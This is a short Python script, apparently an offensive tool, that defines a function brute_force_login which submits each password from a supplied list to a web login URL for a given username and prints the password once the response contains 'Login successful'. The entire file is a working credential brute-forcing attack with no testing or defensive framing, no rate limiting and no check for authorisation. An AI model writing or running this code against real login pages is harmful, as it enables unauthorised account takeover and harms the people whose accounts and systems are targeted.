import requests

def brute_force_login(url, username, password_list):
    print(f"Brute forcing {url} with user: {username}")
    for password in password_list:
        data = {'username': username, 'password': password.strip()}
        try:
            response = requests.post(url, data=data)
            if "Login successful" in response.text:
                print(f"[+] Password found: {password.strip()}")
                return password.strip()
            else:
                print(f"[-] Tried: {password.strip()}")
        except Exception as e:
            print(f"Request failed: {e}")
    print("[-] Password not found")
    return None
